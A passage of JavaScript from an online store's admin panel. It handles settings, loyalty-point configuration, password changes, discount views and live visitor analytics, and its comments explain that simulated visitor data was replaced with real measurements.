    if(d.discount_ceiling_glutathione_acv !== undefined) document.getElementById('discountCeilingGlutathioneAcv').value = d.discount_ceiling_glutathione_acv;
    if(d.discount_ceiling_standard !== undefined) document.getElementById('discountCeilingStandard').value = d.discount_ceiling_standard;
    if(d.offer_deadline) { const od = document.getElementById('offerDeadline'); if (od) od.value = String(d.offer_deadline).slice(0,16); }
    if(d.offer_label) document.getElementById('offerLabel').value = d.offer_label;
    if(d.offer_sub) document.getElementById('offerSub').value = d.offer_sub;
    if(d.interface_theme) {
      // A local palette choice wins on this device; backend remains the
      // fallback for a new device or a cleared browser session.
      const localPalette = PALETTE_ALIASES[localStorage.getItem(PALETTE_KEY)] || localStorage.getItem(PALETTE_KEY);
      const serverPalette = PALETTE_ALIASES[d.interface_theme] || d.interface_theme;
      const selectedPalette = VALID_PALETTES.includes(localPalette) ? localPalette : serverPalette;
      applyPaletteClass(selectedPalette);
      if (!VALID_PALETTES.includes(localPalette)) {
        try { localStorage.setItem(PALETTE_KEY, selectedPalette); } catch {}
      }
    }
    await loadVitaConfig();
    const serverLayoutTheme = d.interface_theme_style || d.dashboard_theme;
    if (serverLayoutTheme || localStorage.getItem(LAYOUT_THEME_KEY)) {
      const localLayoutTheme = THEME_ALIASES[localStorage.getItem(LAYOUT_THEME_KEY)] || localStorage.getItem(LAYOUT_THEME_KEY);
      const selectedLayoutTheme = VALID_THEMES.includes(localLayoutTheme) ? localLayoutTheme : (THEME_ALIASES[serverLayoutTheme] || serverLayoutTheme);
      applyDashboardTheme(selectedLayoutTheme);
      if (!VALID_THEMES.includes(localLayoutTheme)) {
        try { localStorage.setItem(LAYOUT_THEME_KEY, selectedLayoutTheme); } catch {}
      }
    }
  } catch {}
}

async function loadVitaConfig() {
  try {
    const r = await apiFetch('/api/admin/vitapoints/config');
    const d = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(d.error || `Server error (${r.status})`);
    const values = Object.fromEntries((d.config || []).map(row => [row.key, row.value]));
    const map = {
      points_per_rupee_earn: 'vpPointsPerRupeeEarn', points_per_rupee_redeem: 'vpPointsPerRupeeRedeem',
      max_earn_per_order: 'vpMaxEarnPerOrder', max_redeem_per_order: 'vpMaxRedeemPerOrder',
      release_hold_days: 'vpReleaseHoldDays', points_expiry_months: 'vpPointsExpiryMonths',
      milestone_threshold: 'vpMilestoneThreshold', milestone_max_discount: 'vpMilestoneMaxDiscount',
      milestone_min_order: 'vpMilestoneMinOrder',
    };
    Object.entries(map).forEach(([key, id]) => { if (values[key] !== undefined && document.getElementById(id)) document.getElementById(id).value = values[key]; });
    const rate = Number(values.points_per_rupee_redeem || 150);
    const status = document.getElementById('vitaConfigStatus');
    if (status) status.textContent = `Backend rate: ${rate.toLocaleString('en-IN')} points = ₹1 · values loaded`;
  } catch (e) {
    const status = document.getElementById('vitaConfigStatus');
    if (status) status.textContent = 'Could not load backend VitaPoints values';
  }
}

async function saveVitaConfig() {
  const fields = {
    points_per_rupee_earn: 'vpPointsPerRupeeEarn', points_per_rupee_redeem: 'vpPointsPerRupeeRedeem',
    max_earn_per_order: 'vpMaxEarnPerOrder', max_redeem_per_order: 'vpMaxRedeemPerOrder',
    release_hold_days: 'vpReleaseHoldDays', points_expiry_months: 'vpPointsExpiryMonths',
    milestone_threshold: 'vpMilestoneThreshold', milestone_max_discount: 'vpMilestoneMaxDiscount',
    milestone_min_order: 'vpMilestoneMinOrder',
  };
  const values = {};
  for (const [key, id] of Object.entries(fields)) {
    const n = Number(document.getElementById(id)?.value);
    if (!Number.isFinite(n) || n < 0 || (key === 'points_per_rupee_redeem' && n < 1)) { toast(`Invalid VitaPoints value for ${key}`, 'error'); return; }
    values[key] = n;
  }
  const run = async () => {
    for (const [key, value] of Object.entries(values)) {
      const r = await apiFetch(`/api/admin/vitapoints/config/${encodeURIComponent(key)}`, { method: 'PUT', body: JSON.stringify({ value }) });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.error || `Could not save ${key}`);
    }
    const status = document.getElementById('vitaConfigStatus');
    if (status) status.textContent = `Saved · ${Number(values.points_per_rupee_redeem).toLocaleString('en-IN')} points = ₹1`;
    toast('VitaPoints settings saved ✅');
  };
  try {
    if (typeof confirmCriticalAction === 'function') await confirmCriticalAction('Save VitaPoints economics? These values affect future loyalty calculations.', run);
    else await run();
  } catch (e) { toast(e.message, 'error'); }
}

async function saveSettings() {
  if (typeof confirmCriticalAction === 'function') {
    await confirmCriticalAction('Save global store settings? These changes affect every visitor immediately.', saveSettingsCore);
    return;
  }
  await saveSettingsCore();
}

async function saveSettingsCore() {
  const activePaletteOpt = document.querySelector('.palette-opt.selected');
  const activeLayoutOpt = document.querySelector('.layout-theme-opt.selected');
  const ceilingGlutathioneAcv = Number(document.getElementById('discountCeilingGlutathioneAcv').value);
  const ceilingStandard = Number(document.getElementById('discountCeilingStandard').value);
  if (!Number.isFinite(ceilingGlutathioneAcv) || ceilingGlutathioneAcv < 0 || ceilingGlutathioneAcv > 50 || !Number.isFinite(ceilingStandard) || ceilingStandard < 0 || ceilingStandard > 50) {
    toast('Discount ceilings must be between 0% and 50%', 'error'); return;
  }
  const readNonNegative = (id, fallback) => {
    const n = Number(document.getElementById(id)?.value);
    return Number.isFinite(n) && n >= 0 ? n : fallback;
  };
  const deliveryPolicy = {
    shipping_mode: (document.getElementById('shippingMode')||{}).value || 'paid',
    shipping_fee: readNonNegative('shippingFee', 79),
    free_shipping_threshold: readNonNegative('freeShippingThreshold', 599),
    cod_enabled: document.getElementById('codAvailable').checked,
    cod_min_order: readNonNegative('codMinOrder', 0),
    cod_max_order: readNonNegative('codMaxOrder', 0),
    cod_allowed_all_orders: document.getElementById('codAllowedAllOrders').checked,
  };
  const settings = {
    store_online: document.getElementById('storeOnline').checked,
    shipping_mode: deliveryPolicy.shipping_mode,
    shipping_fee: deliveryPolicy.shipping_fee,
    free_shipping_threshold: deliveryPolicy.free_shipping_threshold,
    cod_available: deliveryPolicy.cod_enabled,
    cod_enabled: deliveryPolicy.cod_enabled,
    cod_min_order: deliveryPolicy.cod_min_order,
    cod_max_order: deliveryPolicy.cod_max_order,
    cod_allowed_all_orders: deliveryPolicy.cod_allowed_all_orders,
    delivery_policy: deliveryPolicy,
    free_shipping: {threshold: deliveryPolicy.free_shipping_threshold},
    whatsapp_number: document.getElementById('whatsappNumber').value,
    gst_rate: {cgst: parseFloat(document.getElementById('cgstRate').value)||2.5, sgst: parseFloat(document.getElementById('sgstRate').value)||2.5},
    razorpay_mode: document.getElementById('pgMode').value,
    discount_ceiling_glutathione_acv: ceilingGlutathioneAcv,
    discount_ceiling_standard: ceilingStandard,
    offer_deadline: document.getElementById('offerDeadline').value ? new Date(document.getElementById('offerDeadline').value).toISOString() : '',
    offer_label: document.getElementById('offerLabel').value.trim(),
    offer_sub: document.getElementById('offerSub').value.trim(),
    interface_theme: activePaletteOpt ? activePaletteOpt.dataset.theme : (localStorage.getItem(PALETTE_KEY) || 'plum'),
    interface_theme_style: activeLayoutOpt ? activeLayoutOpt.dataset.theme : (localStorage.getItem(LAYOUT_THEME_KEY) || 'command'),
  };
  try {
    const r = await apiFetch('/api/admin/settings', {method:'PUT', body:JSON.stringify(settings)});
    const ct = r.headers.get('content-type') || '';
    let d = {};
    if(ct.includes('application/json')) d = await r.json();
    if(!r.ok) throw new Error(d.error || d.message || `Server error (${r.status})`);
    toast('Settings saved ✅');
  } catch(e) { toast(e.message, 'error'); }

  try {
    const cur = document.getElementById('curPwd').value;
    const nw  = document.getElementById('newPwd').value;
    if(cur || nw) {
      if(!cur||!nw) { toast('Both password fields are required — enter current and new.','error'); return; }
      const r = await apiFetch('/api/admin/change-password', { method:'POST', body:JSON.stringify({ current:cur, new:nw }) });
      const ct = r.headers.get('content-type') || '';
      let d = {};
      if(ct.includes('application/json')) d = await r.json().catch(()=>({}));
      if(!r.ok) throw new Error(d.error || d.message || `Server error (${r.status})`);
      if(d.builtin && d.note) toast(d.note, 'success'); else toast('Password updated ✅ Session refreshed — you stay signed in.','success');
      document.getElementById('curPwd').value = '';
      document.getElementById('newPwd').value = '';
      // Changing the password bumps this account's token version, which
      // revokes the token the panel is holding right now — the next
      // background request would 401 and kick the admin back to the login
      // screen ('session expired' the moment the password changed). Re-
      // authenticate silently with the NEW credentials instead, so the
      // change of password never looks like a forced logout.
      try {
        var who = String(localStorage.getItem('ascovita_session') ? JSON.parse(localStorage.getItem('ascovita_session')).username : (sessionStorage.getItem('ascovita_role') === 'owner' ? 'owner' : 'admin'));
        var lr = await fetch(`${API}/api/admin/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: who, password: nw }),
          signal: AbortSignal.timeout(35000),
        });
        var ld = await lr.json().catch(() => ({}));
        if (lr.ok && ld.token) {
          __loginSuccess(ld);
        } else if (ld && ld.pending_otp) {
          // Email OTP 2FA is active: the server needs the owner's mailbox
          // before issuing a token, which cannot be done silently. Warn
          // instead of bouncing — the password change itself succeeded.
          toast('Password changed ✅ For full security, sign in again (a code will be emailed to you).', 'warning');
        } else {
          // Auto re-login failed (e.g. Render env still holds the old
          // password for a built-in account) — warn instead of bouncing.
          toast('Password changed, but the session could not be refreshed — sign in again with the new password.', 'warning');
        }
      } catch (e) {
        toast('Password changed — sign in again with the new password if the panel asks.', 'warning');
      }
    }
  } catch(e) { toast(e.message, 'error'); }
}

// ═══════════════════════════════════════════════
// GLOBAL SEARCH
// ═══════════════════════════════════════════════
function handleGlobalSearch(q) {
  if(!q) return;
  q = q.toLowerCase();
  const orderMatch = allOrders.find(o => o.id.toLowerCase().includes(q) || o.customer_name?.toLowerCase().includes(q));
  if(orderMatch) { showPage('orders'); setTimeout(() => { document.getElementById('orderSearch').value=q; filterOrders(); }, 100); }
}

// ═══════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════
function fmtNum(n) { return parseFloat(n||0).toLocaleString('en-IN'); }
function fmtDate(d) { if(!d) return '-'; return new Date(d).toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'}); }
function fmtTime(d) { if(!d) return '-'; return new Date(d).toLocaleString('en-IN',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}); }

function statusBadge(s) {
  const map = {Pending:'badge-gold',Processing:'badge-blue',Shipped:'badge-blue',Delivered:'badge-green',Cancelled:'badge-red'};
  const icos = {Pending:'⏳',Processing:'⚙️',Shipped:'🚚',Delivered:'✅',Cancelled:'❌'};
  const key = s||'Pending';
  return `<span class="badge ${map[key]||'badge-gray'}">${icos[key]||'•'} ${key}</span>`;
}

function payBadge(s) {
  if((s||'').includes('Paid')||s==='SUCCESS') return `<span class="badge badge-green">✅ Paid</span>`;
  if((s||'').includes('COD')) return `<span class="badge badge-gold">💵 COD</span>`;
  if(s==='Failed'||s==='FAILED') return `<span class="badge badge-red">❌ Failed</span>`;
  return `<span class="badge badge-gray">${s||'Pending'}</span>`;
}

// Load settings on init
loadSettings();

/* ══ block 8 ══ */


// ═══════════════════════════════════════════════════════
// Ozylix ADMIN v26 — NEW FEATURES (appended, safe)
// ═══════════════════════════════════════════════════════

// ── Disc tabs ──────────────────────────────────────────
function switchDiscTab(tab, el) {
  document.querySelectorAll('#page-discounts .tab-btn').forEach(b => b.classList.remove('active'));
  if (el) el.classList.add('active');
  ['pct','tier'].forEach(p => {
    const pane = document.getElementById('discPane_'+p);
    if (pane) pane.style.display = p===tab ? 'block' : 'none';
  });
  if (tab === 'tier') renderTierDiscounts();
}

function renderDiscountKpis() {
  const active = allDiscounts.filter(d => d.active !== false && !d.deleted_at);
  const avgPct = active.length ? active.reduce((s,d)=>s+parseFloat(d.value||0),0)/active.length : 0;
  const totalUses = allDiscounts.reduce((s,d)=>s+(d.used_count||0),0);
  const tierProds = allProducts.filter(p => {
    if (!p.tiers) return false;
    try { const t = typeof p.tiers==='string'?JSON.parse(p.tiers):p.tiers; return Array.isArray(t)&&t.length>0; } catch{ return false; }
  }).length;
  const se = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
  se('discActiveCount', active.length);
  se('discAvgPct', avgPct.toFixed(1)+'%');
  se('discTierCount', tierProds);
  se('discTotalUses', totalUses.toLocaleString());
}

function renderDiscountsNew() {
  const tbody = document.getElementById('discountsTbody');
  if (!tbody) return;
  const list = allDiscounts.filter(d => !d.type || d.type==='percent' || d.type==='percentage' || parseFloat(d.value)<=100);
  if (!list.length) {
    tbody.innerHTML = `<tr><td colspan="8"><div class="empty-state"><div class="empty-ico">🏷️</div><div class="empty-msg">No % discounts found.</div></div></td></tr>`;
    return;
  }
  tbody.innerHTML = list.map(c => {
    const pct = parseFloat(c.value||0);
    const r=18, circ=2*Math.PI*r, dash=(pct/100)*circ;
    const col = pct>=50?'var(--red)':pct>=30?'var(--gold-text)':'var(--green-text)';
    return `<tr style="${c.deleted_at?'opacity:0.4;':''}">
      <td><div style="font-weight:600;font-size:0.85rem;">${c.code||c.name||'Discount'}</div></td>
      <td><span style="font-family:var(--display);font-size:1.4rem;font-weight:800;color:${col};">${pct}%</span></td>
      <td><svg width="42" height="42" viewBox="0 0 42 42" style="transform:rotate(-90deg);">
        <circle cx="21" cy="21" r="${r}" fill="none" stroke="rgba(216,103,110,0.12)" stroke-width="4"/>
        <circle cx="21" cy="21" r="${r}" fill="none" stroke="${col}" stroke-width="4" stroke-dasharray="${dash.toFixed(1)} ${circ.toFixed(1)}" stroke-linecap="round"/>
      </svg></td>
      <td>₹${fmtNum(c.min_order||0)}</td>
      <td style="font-family:var(--mono);">${c.used_count||0}/${c.max_uses||'∞'}${c.max_uses_per_customer?` · ${c.max_uses_per_customer}/customer`:''}${c.max_discount!=null?` · cap ₹${c.max_discount}`:''}</td>
      <td style="font-size:0.75rem;color:var(--text3);">${c.expires_at?fmtDate(c.expires_at):'No expiry'}</td>
      <td>${c.deleted_at?'<span class="badge badge-red">Deleted</span>':c.active!==false?'<span class="badge badge-green">Active</span>':'<span class="badge badge-gray">Inactive</span>'}</td>
      <td><div style="display:flex;gap:4px;">
        <button class="btn btn-secondary btn-sm btn-icon" onclick="openCouponModal(${c.id})">✏️</button>
        <button class="btn btn-danger btn-sm btn-icon" onclick="deleteCoupon(${c.id})">🗑️</button>
      </div></td>
    </tr>`;
  }).join('');
}

function renderTierDiscounts() {
  const container = document.getElementById('tierDiscGrid');
  if (!container) return;
  const prodsWithTiers = allProducts.filter(p => {
    if (!p.tiers) return false;
    try { const t=typeof p.tiers==='string'?JSON.parse(p.tiers):p.tiers; return Array.isArray(t)&&t.length>0; } catch{ return false; }
  });
  if (!prodsWithTiers.length) {
    container.innerHTML = `<div class="empty-state" style="padding:40px;grid-column:1/-1;"><div class="empty-ico">📦</div><div class="empty-msg">No tier pricing found. Add tiers via Products → Pricing tab.</div></div>`;
    return;
  }
  container.innerHTML = prodsWithTiers.map(p => {
    let tiers = [];
    try { tiers = typeof p.tiers==='string'?JSON.parse(p.tiers):p.tiers; } catch{}
    const maxDisc = Math.max(0, ...tiers.map(t=>parseFloat(t.discount||t.discount_pct||0)));
    return `<div class="card">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
        <img src="${adminCdnImg(p.image)||''}" onerror="this.style.display='none'" style="width:36px;height:36px;border-radius:6px;object-fit:contain;background:var(--bg2);">
        <div>
          <div style="font-weight:700;font-size:0.85rem;">${p.name||'Product'}</div>
          <div style="font-size:0.7rem;color:var(--text3);">Up to <span style="color:var(--green-text);font-weight:700;">${maxDisc}% OFF</span></div>
        </div>
      </div>
      ${tiers.map(t => {
        const disc=parseFloat(t.discount||t.discount_pct||0);
        return `<div style="background:var(--bg2);border-radius:8px;padding:9px 11px;margin-bottom:6px;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
            <span style="font-size:0.78rem;font-weight:600;">${t.qty||t.units||t.tablets||'?'} pack</span>
            <div style="display:flex;align-items:center;gap:6px;">
              <span style="text-decoration:line-through;font-size:0.7rem;color:var(--text3);">₹${t.mrp||t.price||'?'}</span>
              <span style="color:var(--green-text);font-weight:700;">₹${t.rate||t.sale_price||'?'}</span>
              <span style="background:rgba(94,171,48,0.15);color:var(--green-text);border-radius:4px;padding:1px 5px;font-size:0.65rem;font-weight:700;">${disc}%</span>
            </div>
          </div>
          <div style="height:5px;border-radius:3px;background:var(--border);overflow:hidden;"><div style="height:100%;width:${Math.min(disc*1.1,100)}%;background:linear-gradient(90deg,var(--green),var(--green-bright));border-radius:3px;"></div></div>
        </div>`;
      }).join('')}
    </div>`;
  }).join('');
}

// Hook into existing loadDiscounts and renderDiscounts (called after originals)
const _v26_ldOrig = loadDiscounts;
loadDiscounts = async function() {
  await _v26_ldOrig();
  renderDiscountsNew();
  renderDiscountKpis();
};
const _v26_rdOrig = renderDiscounts;
renderDiscounts = function() {
  _v26_rdOrig();
  renderDiscountsNew();
  renderDiscountKpis();
};

// ── Live Visitors enhanced ─────────────────────────────
let _lvTraff=[], _lvStream=[], _lvGlobAng=0, _lvGlobRAF=null;
/* _genSim() and its _DPG/_DPC/_DPD/_DPS sample arrays were deleted here.
   They existed to fabricate visitor sessions when the backend was down —
   invented cities, devices and pages, shown as if they were customers.
   Real analytics replaced them; the panel now reports an outage instead. */

/* ═══════════════════════════════════════════════════════════════════
   LIVE VISITORS — real data only
   ───────────────────────────────────────────────────────────────────
   The version that used to sit here had three problems worth naming, so
   they don't get reintroduced:
     1. When the backend call failed it generated fake sessions with
        _genSim() — invented cities, devices and pages — and showed them as
        if they were real customers. A business decision made on invented
        traffic is worse than one made on no traffic.
     2. Bounce Rate was `(38+0|Math.random()*18)+'%'` — a random number.
        (It also had an operator-precedence bug: + binds tighter than |,
        so it was `38 | random`, which can only ever produce 38,39,46,47,
        54,55,62,63 — never a plausible spread anyway.)
     3. "Converting" counted sessions where `s.status === 'checkout'`, but
        /api/visitors/active never returned a `status` field, so it was
        permanently 0.
   All three numbers now come from the server, measured. When the backend
   is unreachable the panel says so instead of inventing traffic.
   ═══════════════════════════════════════════════════════════════════ */
updateLiveVisitors = async function () {
  const se = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
  let sessions = [], cnt = 0, views = 0, converting = 0, live = false;

  try {
    const r = await fetch(API + '/api/visitors/active', {
      headers: { 'Authorization': `Bearer ${authToken}` },
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) throw new Error('HTTP ' + r.status);
    const d = await r.json();
    sessions   = Array.isArray(d.sessions) ? d.sessions : [];
    cnt        = d.active_count || sessions.length || 0;
    views      = d.page_views_today || 0;
    converting = d.converting || 0;
    live = true;
    const n = document.getElementById('lvNotice'); if (n) n.style.display = 'none';

    // Answers "is this really only ozylix.com or is something else feeding
    // in too" directly in the panel, instead of having to ask.
    const bd = document.getElementById('lvSiteBreakdown');
    if (bd) {
      const entries = Object.entries(d.site_breakdown || {}).sort((a, b) => b[1] - a[1]);
      bd.textContent = entries.length
        ? 'Live traffic by site: ' + entries.map(([s, c]) => `${s} (${c})`).join(' · ')
        : '';
    }
  } catch (e) {
    const n = document.getElementById('lvNotice');
    if (n) {
      n.style.display = 'block';
      n.innerHTML = `<div style="padding:16px;font-size:0.82rem;color:var(--text2);line-height:1.9;">
        <strong style="color:var(--red);">Live visitor feed unavailable</strong> — ${e.message}<br>
        <span style="font-size:0.75rem;color:var(--text3);">
          Check that the backend is awake and that <code>analytics-routes.js</code> is deployed
          and <code>analytics-schema.sql</code> has been run in Supabase.
          No sample data is shown here on purpose.
        </span></div>`;
    }
  }

  se('liveCount', live ? cnt : '–');
  se('lvActive',  live ? cnt : '–');
  se('lvViews',   live ? views.toLocaleString('en-IN') : '–');
  se('lvSessionCount', sessions.length);
  se('lvConv',    live ? converting : '–');

  const avg = sessions.length ? Math.round(sessions.reduce((a, v) => a + (v.duration || 0), 0) / sessions.length) : 0;
  se('lvSession', avg ? `${Math.floor(avg / 60)}m ${String(avg % 60).padStart(2, '0')}s` : (live ? '0m 00s' : '–'));

  /* Bounce rate is a property of a date range, not of who happens to be
     online this second — it comes from the analytics summary instead. */
  se('lvRefreshTime', (live ? 'Live · ' : 'Offline · ') +
    new Date().toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit' }));

  _lvTraff.push(cnt); if (_lvTraff.length > 60) _lvTraff.shift();
  _drawLvTraffic();

  const tb = document.getElementById('liveSessionsTbody');
  if (tb) {
    tb.innerHTML = sessions.length ? sessions.map(v => {
      const badge = v.status === 'converted' ? 'badge-green'
                  : v.status === 'checkout'  ? 'badge-gold' : 'badge-gray';
      const dev = [v.device, v.os].filter(Boolean).join(' · ') + (v.is_pwa ? ' · App' : '');
      return `<tr>
        <td><span class="badge badge-blue" style="font-size:0.68rem;">${_vaEsc(v.site || 'unknown')}</span></td>
        <td style="font-family:var(--mono);font-size:0.75rem;color:var(--green-text);">${_vaEsc(v.page || '/')}</td>
        <td style="font-size:0.78rem;">${_vaEsc(v.city || 'India')}</td>
        <td style="font-size:0.78rem;">${_vaEsc(dev)}</td>
        <td style="font-family:var(--mono);font-size:0.75rem;">${Math.floor((v.duration || 0) / 60)}:${String((v.duration || 0) % 60).padStart(2, '0')}</td>
        <td><span class="badge badge-gray">${_vaEsc(v.source || 'Direct')}</span></td>
        <td><span class="badge ${badge}">${_vaEsc(v.status || 'browsing')}</span></td>
      </tr>`;
    }).join('')
    : `<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text3);font-size:0.82rem;">${live ? 'Nobody on the site right now' : 'Not connected'}</td></tr>`;
  }

  if (sessions.length) {
    const s0 = sessions[0];
    // _lvAddStream drops its argument straight into innerHTML, so every
    // field must be escaped here — page/city/device/source all come from
    // the client-controlled analytics ping.
    _lvAddStream(`${esc(s0.city || 'India')} · ${esc(s0.device || '')} · ${esc(s0.page || '/')} · via ${esc(s0.source || 'Direct')}`);
  }
  _lvPageDist(sessions);

  const counts = {};
  sessions.forEach(v => { counts[v.page || '/'] = (counts[v.page || '/'] || 0) + 1; });
  const top = Object.entries(counts).sort((a, b) => b[1] - a[1])[0];
  se('lvTopPage', top ? top[0] : '–');
};

/* ═══════════════════════════════════════════════════════════════════
   VISITOR ANALYTICS — day / week / month history
   One call to /api/analytics/dashboard fills the whole section.
   Uses the Chart.js instance already loaded on this page and this file's
   own colour tokens — no new library, no new palette.
   ═══════════════════════════════════════════════════════════════════ */
let _vaRange = 'today';
let _vaTrendChart = null, _vaDeviceChart = null, _vaOsChart = null;
let _vaLoading = false;

const _VA_COLORS = ['#547177', '#A97A1E', '#3B7EA6', '#B65B1E', '#C2434F', '#7C8B62', '#8B6BA8', '#4F7A6A'];

function _vaEsc(v) {
  return String(v == null ? '' : v).replace(/[&<>"']/g, c =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function _vaNum(n) { return (Number(n) || 0).toLocaleString('en-IN'); }
function _vaDur(sec) {
  sec = Math.max(0, Math.round(Number(sec) || 0));
  if (sec < 60) return sec + 's';
  const m = Math.floor(sec / 60);
  return m < 60 ? `${m}m ${String(sec % 60).padStart(2, '0')}s` : `${Math.floor(m / 60)}h ${m % 60}m`;
}
function _vaDelta(el, pct) {
  const e = document.getElementById(el); if (!e) return;
  const n = Number(pct);
  if (!isFinite(n) || n === 0) { e.textContent = 'no change'; e.style.color = 'var(--text3)'; return; }
  e.textContent = (n > 0 ? '▲ ' : '▼ ') + Math.abs(n) + '% vs previous';
  e.style.color = n > 0 ? 'var(--green-text)' : 'var(--red)';
}

/* Horizontal bar list — used for Browser and Traffic Source. Reads better
   than a third pie chart and stays legible with 8+ rows. */
function _vaBars(elId, rows, unit) {
  const el = document.getElementById(elId); if (!el) return;
  if (!rows || !rows.length) {
    el.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;padding:12px 0;">No data for this period</div>';
    return;
  }
  const max = Math.max(...rows.map(r => r.count), 1);
  el.innerHTML = rows.map((r, i) => `
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:9px;">
      <div style="width:110px;flex-shrink:0;font-size:0.76rem;color:var(--text2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${_vaEsc(r.label)}</div>
      <div style="flex:1;background:var(--surface2);border-radius:4px;height:10px;overflow:hidden;">
        <div style="width:${(r.count / max * 100).toFixed(1)}%;height:100%;background:${_VA_COLORS[i % _VA_COLORS.length]};border-radius:4px;"></div>
      </div>
      <div style="width:88px;text-align:right;font-family:var(--mono);font-size:0.72rem;color:var(--text2);flex-shrink:0;">
        ${_vaNum(r.count)}${unit ? '' : ''} <span style="color:var(--text3);">${r.pct}%</span>
      </div>
    </div>`).join('');
}

function _vaLegend(elId, rows) {
  const el = document.getElementById(elId); if (!el) return;
  el.innerHTML = (rows || []).map((r, i) => `
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px;font-size:0.76rem;">
      <span style="width:9px;height:9px;border-radius:2px;background:${_VA_COLORS[i % _VA_COLORS.length]};flex-shrink:0;"></span>
      <span style="flex:1;color:var(--text2);">${_vaEsc(r.label)}</span>
      <span style="font-family:var(--mono);color:var(--text3);">${_vaNum(r.count)} · ${r.pct}%</span>
    </div>`).join('') || '<div style="color:var(--text3);font-size:0.78rem;">No data</div>';
}

function _vaDoughnut(existing, canvasId, rows) {
  const c = document.getElementById(canvasId);
  if (!c || typeof Chart === 'undefined') return existing;
  if (existing) existing.destroy();
  const r = rows && rows.length ? rows : [{ label: 'No data', count: 1 }];
  return new Chart(c.getContext('2d'), {
    type: 'doughnut',
    data: {
      labels: r.map(x => x.label),
      datasets: [{
        data: r.map(x => x.count),
        backgroundColor: r.map((_, i) => rows && rows.length ? _VA_COLORS[i % _VA_COLORS.length] : '#DDD6C9'),
        borderWidth: 0
      }]
    },
    options: {
      responsive: true, maintainAspectRatio: false, cutout: '62%',
      plugins: { legend: { display: false } }
    }
  });
}

function _vaTable(tbodyId, rows, emptyText) {
  const tb = document.getElementById(tbodyId); if (!tb) return;
  tb.innerHTML = (rows && rows.length)
    ? rows.map(r => `<tr>
        <td style="font-size:0.78rem;font-family:var(--mono);">${_vaEsc(r.label)}</td>
        <td style="text-align:right;font-family:var(--mono);font-size:0.78rem;">${_vaNum(r.count)}</td>
        <td style="text-align:right;font-size:0.75rem;color:var(--text3);">${r.pct}%</td>
      </tr>`).join('')
    : `<tr><td colspan="3" style="text-align:center;padding:18px;color:var(--text3);font-size:0.8rem;">${emptyText || 'No data'}</td></tr>`;
}

function _vaBucketFmt(iso, bucket) {
  const d = new Date(iso);
  if (bucket === 'hour')  return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });
  if (bucket === 'month') return d.toLocaleDateString('en-IN', { month: 'short', year: '2-digit' });
  return d.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' });
}

async function loadVisitorAnalytics(range) {
  if (range) _vaRange = range;
  if (_vaLoading) return;
  _vaLoading = true;

  document.querySelectorAll('.va-range').forEach(b => {
    const on = b.dataset.range === _vaRange;
    b.style.background   = on ? 'var(--green)' : '';
    b.style.color        = on ? '#fff' : '';
    b.style.borderColor  = on ? 'var(--green)' : '';
  });

  const state = document.getElementById('vaState');
  if (state) { state.textContent = 'Loading…'; state.style.color = 'var(--text3)'; }

  try {
    // The dashboard is now server-cached (shared, 20s TTL), so one warm
    // round trip usually takes well under a second. Give slow cold starts
    // and traffic spikes up to 60s, and retry once before giving up.
    async function vaTry(timeoutMs) {
      const r = await fetch(`${API}/api/analytics/dashboard?range=${encodeURIComponent(_vaRange)}`, {
        headers: { 'Authorization': `Bearer ${authToken}` },
        signal: AbortSignal.timeout(timeoutMs)
      });
      if (!r.ok) throw new Error('HTTP ' + r.status, { cause: { status: r.status } });
      return await r.json();
    }
    let d = null;
    try { d = await vaTry(45000); } catch (e1) {
      await new Promise(r => setTimeout(r, 3000));
      try { d = await vaTry(45000); } catch (e2) { throw e2; }
    }
    const o = d.overview || {};

    document.getElementById('vaSessions').textContent    = _vaNum(o.sessions);
    document.getElementById('vaPageviews').textContent   = _vaNum(o.pageviews);
    document.getElementById('vaDuration').textContent    = _vaDur(o.avg_duration);
    document.getElementById('vaBounce').textContent      = (Number(o.bounce_rate) || 0) + '%';
    document.getElementById('vaConversions').textContent = _vaNum(o.conversions);
    document.getElementById('vaConvRate').textContent    = (Number(o.conversion_rate) || 0) + '%';
    document.getElementById('vaRevenue').textContent     = '₹' + _vaNum(Math.round(Number(o.revenue) || 0));
    document.getElementById('vaSignedIn').textContent    = _vaNum(o.signed_in);
    document.getElementById('vaBots').textContent        = _vaNum(o.bots_filtered) + ' bots filtered out';

    const ch = d.change || {};
    _vaDelta('vaSessionsD',    ch.sessions);
    _vaDelta('vaPageviewsD',   ch.pageviews);
    _vaDelta('vaConversionsD', ch.conversions);
    _vaDelta('vaRevenueD',     ch.revenue);

    // ── history chart ──
    const pts = d.series || [];
    const bl = document.getElementById('vaBucketLabel');
    if (bl) bl.textContent = pts.length ? `${pts.length} ${d.bucket === 'hour' ? 'hours' : d.bucket === 'month' ? 'months' : 'days'}` : '';
    const cv = document.getElementById('vaTrendChart');
    if (cv && typeof Chart !== 'undefined') {
      if (_vaTrendChart) _vaTrendChart.destroy();
      _vaTrendChart = new Chart(cv.getContext('2d'), {
        type: 'line',
        data: {
          labels: pts.map(p => _vaBucketFmt(p.bucket, d.bucket)),
          datasets: [
            { label: 'Visitors',  data: pts.map(p => p.visitors),  borderColor: '#547177', backgroundColor: 'rgba(84,113,119,0.14)', fill: true, tension: 0.35, borderWidth: 2, pointRadius: 0, pointHoverRadius: 4 },
